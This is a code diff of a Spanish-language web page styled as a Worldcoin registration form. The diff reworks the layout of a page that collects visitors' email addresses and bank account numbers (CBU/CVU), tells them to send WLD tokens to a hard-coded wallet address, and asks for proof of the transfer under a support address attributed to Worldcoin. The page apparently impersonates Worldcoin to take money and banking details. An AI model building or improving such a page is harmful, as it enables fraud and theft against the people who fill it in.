@@ -76,48 +76,45 @@
 </head>
 
 <body>
-<div class="container">
+ <div class="container">
+        <h2>Registro - Worldcoin</h2>
 
-    <h2>Paso 1: Ingresa tu correo</h2>
+        <div class="input-group">
+            <label for="email">Ingresa tu correo:</label>
+            <input type="text" id="email" placeholder="Correo electrónico">
+            <button onclick="registrarCorreo()">Registrar y Enviar</button>
+            <div class="success-text" id="email-success"></div>
+        </div>
 
-    <div class="input-group">
-        <label for="email">Ingresa tu correo:</label>
-        <input type="text" id="email" placeholder="Correo electrónico">
-        <button onclick="registrarCorreo()">Registrar y Enviar</button>
-        <div class="success-text" id="email-success"></div>
-    </div>
+        <div class="input-group">
+            <label for="cbu">Coloca tu CBU/CVU:</label>
+            <input type="text" id="cbu" placeholder="CBU/CVU">
+            <button onclick="registrarCBU()">Registrar y Enviar</button>
+            <div class="success-text" id="cbu-success"></div>
+        </div>
 
-    <h2>Paso 2: Coloca tu CBU/CVU</h2>
-
-    <div class="input-group">
-        <label for="cbu">Coloca tu CBU/CVU:</label>
-        <input type="text" id="cbu" placeholder="CBU/CVU">
-        <button onclick="registrarCBU()">Registrar y Enviar</button>
-        <div class="success-text" id="cbu-success"></div>
-    </div>
-
-    <h2>Paso 3: Copia y envía los WLD</h2>
-
-    
-            <div class="input-group mb-3">
-                <label class="form-label">Copia y envía los WLD a esta dirección:</label>
-                <div class="input-group">
-                    <input type="text" class="form-control" id="wallet-address" value="0x772c9ffc982ef49b8b3fe750ee8e15010b4857c3" readonly>
-                    <button class="btn btn-sm btn-primary" onclick="copiarDireccion()">Copiar</button>
-                </div>
+      <div class="card">
+    <div class="card-body">
+        <div class="input-group mb-3">
+            <label class="form-label">Copia y envía los WLD a esta dirección:</label>
+            <div class="input-group">
+                <input type="text" class="form-control" id="wallet-address" value="0x772c9ffc982ef49b8b3fe750ee8e15010b4857c3" readonly>
+                <button class="btn btn-sm btn-primary" onclick="copiarDireccion()">Copiar</button>
             </div>
-
-            <div class="mb-3">
-                <label for="comprobante" class="form-label">Sube el comprobante del envío de Worldcoin:</label>
-                <input type="file" class="form-control" id="comprobante">
-            </div>
-       
-
-    <div class="support-text">
-        <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
+        </div>
+        
+        <div class="mb-3">
+            <label for="comprobante" class="form-label">Sube el comprobante del envío de Worldcoin:</label>
+            <input type="file" class="form-control" id="comprobante">
+        </div>
     </div>
-         </div>
+</div>
 
+
+        <div class="support-text">
+            <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
+        </div>
+    </div>
 
     <script>
         // Las funciones de JavaScript siguen igual
